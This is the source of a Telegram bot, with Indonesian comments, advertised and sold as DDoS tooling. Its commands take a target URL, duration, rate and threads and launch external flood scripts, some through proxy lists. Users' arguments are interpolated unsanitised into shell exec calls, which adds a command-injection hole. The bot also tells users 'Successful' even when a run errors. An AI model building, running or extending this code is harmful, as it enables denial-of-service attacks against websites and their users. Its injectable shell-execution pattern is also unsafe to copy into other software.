// base : DitzzXploit
// create : DitzzXploit || no delate credits sc

const TelegramBot = require('node-telegram-bot-api');
const runningProcesses = {};
const { exec } = require('child_process');
const settings = require('./settings')
const token = settings.token;

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Tidak ada'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);
  
  if (command.startsWith('/start')) {
      bot.sendMessage(chatId, "Helo user Command Tools Ddos,tekan button di bawah untuk tools ddos || khusus user vvip /uservvip", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Tools Ddos", callback_data: "/toolsddos"}]
]
}
      }
       )
}
if (command.startsWith('/toolsddos')) {
        const menuText = `
╭──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
├ Nama Bot = BABU NYA DitzzXploit 2024
├ Owner = @DitzzXploit
├ Founder = @DitzzXploit
╰──❏「 DITZZXPLOIT 」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃➥ /mix
┃➥ /bypassx
┃➥ /vvip
┗━━━━━[ ARTA STORE  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
 bot.sendPhoto(chatId, settings.pp, { caption: menuText})
 }
 
 if (command.startsWith('/uservvip')) { 
 const ditzz = ` Ini fitur ddos Vvip ya
    /vvip2 - tools ddos vvip2 tembus nasa 🙂 ( process )
    /uam - tools ddos uam ( process )
    /bypassx - tools ddos bypass
    /tlsx - tools ddos x
    /brow - tools ddos brow 🥶
    /ditzz - tools ddos ditzz
    /http - cek website
    /ping - cek ping website
    /gsnck - tools ddos new
    /hold - tools ddos hold ( new tools )
    /sync - tools ddos sync ( new tools )`
    bot.sendPhoto(chatId, settings.pp, { caption: ditzz})
    }


    if (command.startsWith('/sc')) {
        bot.sendMessage(chatId, "Sc By DitzzXploit, Mau buy sc silahkan klik button di bawah", {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Creator", url: "https://t.me/DitzzXploit"}],
                    [{ text: 'buysc', url: 'https://t.me/DitzzXploit'}],
                    [{ text: 'yt', url: 'https://youtube.com/@DitzzXploit?si=gpX1ZDx7_vf8rJnb'}]
                    ]
                }
            }
    )
        }
        if (command.startsWith('/http')) {
        const args = command.split(' ')
        const web = args[1];
        const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
        bot.sendMessage(chatId, 'Untuk hasil cek di bawah', {
        reply_markup: {
        inline_keyboard: [
        [{ text: 'hasil', url: `https://check-host.net/check-http?host=${web}&csrf_token=`}],
        [{ text: 'buysc', url: 'https://t.me/DitzzXploit'}],
        [{ text: 'yt', url: 'https://youtube.com/@DitzzXploit?si=gpX1ZDx7_vf8rJnb'}]
        ]
     }
  }
}
    
    if (command.startsWith('/ping')) {
        const args = command.split(' ')
        const web = args[1];
        const url = `https://check-host.net/check-ping?host=${web}&csrf_token=`;
        bot.sendMessage(chatId, 'Untuk hasil cek di bawah', {
        reply_markup: {
        inline_keyboard: [
        [{ text: 'hasil', url: `https://check-host.net/check-ping?host=${web}&csrf_token=`}],
        [{ text: 'buysc', url: 'https://t.me/DitzzXploit'}],
        [{ text: 'yt', url: 'https://youtube.com/@DitzzXploit?si=gpX1ZDx7_vf8rJnb'}]
        ]
     }
  }
}
        
  // Menanggapi perintah /mix
  if (command.startsWith('/mix')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && thread && rate) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /mix [url] [time] [thread] [rate]');
      }
    }
        if (command.startsWith('/vvip')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rps = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rps && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node TLS-P.js ${url} ${time} ${rps} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, `Proses Attack Bro Ditzz`);
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /vvip [url] [time] [rps] [thread]');
    }
  }
  
  if (command.startsWith('/vvip2')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node vvip2.js ${url} ${time} ${rate} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, `Proses Attack Bro Ditzz`);
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /vvip2 [url] [time] [rate] [thread]');
    }
  }
  
    // Menanggapi perintah /mix
  if (command.startsWith('/bypassx')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node Bypass-X.js ${url} ${time} ${rate} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /bypassx [url] [time] [thread] [rate]');
      }
    }
    
      // Menanggapi perintah /mix
  if (command.startsWith('/tlsx')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node TLS-X.js ${url} ${time} ${rate} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /tlsx [url] [time] [thread] [rate]');
      }
    }
    
      // Menanggapi perintah /mix
  if (command.startsWith('/brow')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node BROW-X.js ${url} ${time} ${rate} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /brow [url] [time] [thread] [rate]');
      }
    }
    
      if (command.startsWith('/ditzz')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rps = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rps && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node TZyo.js ${url} ${time} ${rps} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /ditzz [url] [time] [rps] [thread]');
      }
    }
    
         // Menanggapi perintah /mix
  if (command.startsWith('/hold')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node hold.js ${url} ${time} ${rate} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /hold [url] [time] [thread] [rate]');
      }
    }
    
         // Menanggapi perintah /mix
  if (command.startsWith('/gsnck')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node MIXGECKO11.js ${url} ${time} ${thread} ${rate} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /brow [url] [time] [thread]');
      }
    }
    
         // Menanggapi perintah /mix
  if (command.startsWith('/sync')) {
    // Mengekstrak argumen dari pesan
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const rate = args[3];
    const thread = args[4];

    // Memeriksa apakah format pesan benar
    if (args.length === 5 && url && time && rate && thread) {
      // Menjalankan file mix.js dengan argumen yang diberikan
      exec(`node MIXSYN.js ${url} ${time} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Successful');
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Proses telah dimulai.');
      });
    } else {
      // Memberi tahu pengguna bahwa format pesan tidak benar
      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /brow [url] [time] [thread]');
      }
    }
});
